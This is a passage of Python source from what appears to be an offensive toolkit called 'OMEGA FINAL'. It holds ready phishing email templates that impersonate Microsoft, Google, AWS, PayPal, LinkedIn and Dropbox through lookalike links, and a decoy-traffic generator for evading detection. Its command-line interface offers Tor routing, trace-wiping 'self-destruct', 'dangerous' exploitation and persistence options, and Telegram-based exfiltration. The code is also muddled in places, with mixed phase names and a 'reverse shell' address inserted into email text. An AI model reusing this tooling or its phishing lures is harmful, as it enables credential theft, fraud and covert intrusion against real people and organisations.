                'body': f"Dear user,\n\nWe have detected suspicious activity on your account. Please verify your identity by clicking the link below.\n\nhttps://secure-verification.com/{target}\n\nRegards,\nSecurity Team"
            },
            'invoice': {
                'subject': f'Your invoice #INV-{random.randint(10000,99999)} is ready',
                'body': f"Dear customer,\n\nPlease find attached your invoice for payment. Due date: {datetime.datetime.now() + datetime.timedelta(days=7)}\n\nAmount: ${random.randint(100,9999)}.00\n\nView invoice: https://invoice-payment.com/{target}\n\nThank you for your business."
            },
            'security': {
                'subject': 'URGENT: Account compromised',
                'body': f"Dear user,\n\nWe have detected unauthorized access to your account from IP {self.config.get('reverse_shell_ip', '192.168.1.1')}.\n\nTo secure your account, please reset your password immediately:\nhttps://security-reset.com/{target}\n\nIf you did not authorize this access, contact support immediately."
            },
            'reset': {
                'subject': 'Password reset request',
                'body': f"Hello,\n\nYou requested a password reset for your account. Click the link below to set a new password.\n\nhttps://reset-password.com/{target}\n\nThis link expires in 24 hours.\n\nIf you did not request this, ignore this email."
            },
            'linkedin': {
                'subject': 'You have a new connection request',
                'body': f"Hi,\n\n{random.choice(['John', 'Sarah', 'Michael', 'Emily', 'David', 'Jessica'])} would like to connect with you on LinkedIn.\n\nView profile: https://linkedin-connect.com/{target}\n\nAccept or decline: https://linkedin-response.com/{target}"
            },
            'dropbox': {
                'subject': 'Document shared with you',
                'body': f"Hello,\n\n{random.choice(['John', 'Sarah', 'Michael', 'Emily', 'David', 'Jessica'])} shared a document with you on Dropbox.\n\nView document: https://dropbox-share.com/{target}\n\nThis document is confidential and should not be shared."
            },
            'microsoft': {
                'subject': 'Microsoft account verification required',
                'body': f"Dear user,\n\nTo continue using your Microsoft account, please verify your identity.\n\nVerify now: https://microsoft-verify.com/{target}\n\nFailure to verify within 24 hours will result in account suspension."
            },
            'google': {
                'subject': 'Google account security alert',
                'body': f"Hello,\n\nWe detected an unusual sign-in attempt to your Google account from {self.config.get('reverse_shell_ip', '192.168.1.1')}.\n\nReview activity: https://google-security.com/{target}\n\nIf this was you, no action is needed."
            },
            'aws': {
                'subject': 'AWS billing alert',
                'body': f"Dear AWS customer,\n\nYour AWS account has exceeded the free tier usage limit.\n\nCurrent usage: ${random.randint(50,500)}.00\n\nView billing: https://aws-billing.com/{target}\n\nUpdate payment method: https://aws-payment.com/{target}"
            },
            'paypal': {
                'subject': 'Payment received',
                'body': f"Hi,\n\nYou have received a payment of ${random.randint(10,500)}.00 USD from {random.choice(['John', 'Sarah', 'Michael', 'Emily'])}.\n\nView transaction: https://paypal-payment.com/{target}\n\nLogin to your PayPal account to access the funds."
            }
        }

        template_data = templates.get(template, templates['generic'])

        return {
            'subject': template_data['subject'],
            'body': template_data['body'],
            'from': f"{random.choice(['support', 'security', 'admin', 'noreply', 'billing'])}@{random.choice(['company.com', 'secure.net', 'verification.org', 'payments.com'])}",
            'attachments': []
        }


    def generate_decoys(self, count: int = 10) -> List[Dict[str, Any]]:
        """
        Generate decoy traffic and fake data for evasion.

        Args:
            count: Number of decoys to generate

        Returns:
            List of decoy dictionaries

        Example:
            >>> decoys = self.generate_decoys(10)
            >>> print(f"Generated {len(decoys)} decoys")
            Generated 10 decoys
        """
        self.print_danger(f"Generating {count} decoys")

        decoys = []

        for i in range(count):
            decoy = {
                'type': random.choice(['http', 'dns', 'ping', 'scan', 'login', 'download', 'upload', 'email', 'ssh', 'ftp']),
                'source_ip': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'target': f"{random.choice(['www', 'mail', 'admin', 'api', 'dev', 'prod'])}.{random.choice(['example.com', 'test.net', 'demo.org', 'sample.io'])}",
                'timestamp': datetime.datetime.now().isoformat(),
                'data': base64.b64encode(os.urandom(64)).decode()[:64]
            }
            decoys.append(decoy)

        self.save_json(decoys, f"decoys_{TIMESTAMP}.json")
        return decoys


def run_recon(
    target: Union[str, List[str]],
    output_dir: str = "./output",
    config: Dict[str, Any] = None
) -> ReconResult:
    """
    External API entry point for Phase 1 reconnaissance.

    Args:
        target: Single target or list of targets
        output_dir: Output directory path
        config: Optional configuration dictionary

    Returns:
        ReconResult object containing all findings

    Example:
        >>> from phase1_foundation import ReconPhase1
        >>> from phase2_recon import run_recon
        >>> results = run_recon("example.com", "./output", {"threads": 500})
        >>> print(results.summary)
    """
    if config is None:
        config = {}

    config['output_dir'] = output_dir

    if isinstance(target, str):
        targets = [target]
    else:
        targets = list(target)

    recon = ReconPhase1(config)
    return recon.run_phase_1(targets)


def main() -> None:
    """
    Main entry point with command-line argument parsing.

    Example:
        >>> python3 phase2_recon.py example.com --threads 500 --tor
    """
    import argparse

    parser = argparse.ArgumentParser(
        description="OMEGA FINAL Phase 1 - Reconnaissance",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 phase2_recon.py example.com
  python3 phase2_recon.py example.com --threads 500 --tor
  python3 phase2_recon.py targets.txt --output ./results --dangerous
        """
    )

    parser.add_argument(
        "target",
        help="Target domain, IP, CIDR, or file containing list of targets"
    )

    parser.add_argument(
        "--output", "-o",
        default="./output",
        help="Output directory (default: ./output)"
    )

    parser.add_argument(
        "--threads", "-t",
        type=int,
        default=1000,
        help="Number of threads (default: 1000)"
    )

    parser.add_argument(
        "--tor",
        action="store_true",
        help="Route traffic through Tor proxy"
    )

    parser.add_argument(
        "--self-destruct",
        action="store_true",
        help="Enable self-destruct mode (wipes traces on exit)"
    )

    parser.add_argument(
        "--dangerous",
        action="store_true",
        help="Enable dangerous features (exploitation, persistence)"
    )

    parser.add_argument(
        "--telegram-token",
        help="Telegram bot token for exfiltration"
    )

    parser.add_argument(
        "--telegram-chat",
        help="Telegram chat ID for exfiltration"
    )

    parser.add_argument(
        "--wordlist",
        help="Path to subdomain wordlist"
    )

    parser.add_argument(
        "--dirs",
        help="Path to directory wordlist"
    )

    parser.add_argument(
        "--payloads",
        help="Path to payloads file"
    )

    parser.add_argument(
        "--masscan-pps",
        type=int,
        default=100000,
        help="Masscan packets per second (default: 100000)"
    )

    parser.add_argument(
        "--log-level",
        default="DEBUG",
        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
        help="Log level (default: DEBUG)"
    )

    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable color output"
    )

    parser.add_argument(
        "--version",
        action="version",
        version=f"OMEGA FINAL Phase 2 v{VERSION}"
    )

    args = parser.parse_args()

    # Load targets from file if argument is a file
    if os.path.isfile(args.target):
        with open(args.target, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = [args.target]

    config = {
        'threads': args.threads,
        'tor': args.tor,
        'self_destruct': args.self_destruct,
        'enable_dangerous': args.dangerous,
        'telegram_token': args.telegram_token,
        'telegram_chat': args.telegram_chat,
        'wordlist_path': args.wordlist,
        'dirs_wordlist': args.dirs,
        'payloads_file': args.payloads,
        'output_dir': args.output,
        'masscan_pps': args.masscan_pps,
        'log_level': args.log_level,
        'enable_color': not args.no_color
    }

    try:
        result = run_recon(targets, args.output, config)
        print(f"\n✅ Phase 1 completed. Results saved to {RECON_DIR}")
        print(f"📊 Summary: {json.dumps(result.summary, indent=2)}")
        print(f"📄 HTML report: {REPORTS_DIR / f'omega_report_{TIMESTAMP}.html'}")
        print(f"📦 Archive: {RECON_DIR / f'omega_archive_{TIMESTAMP}.zip'}")
        print("\n[ABSOLUTE CODE COMPLETION]")
    except KeyboardInterrupt:
        print("\n🛑 Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()

# ===================================================================
# SECTION 2 COMPLETE - ABSOLUTE CODE COMPLETION
# ===================================================================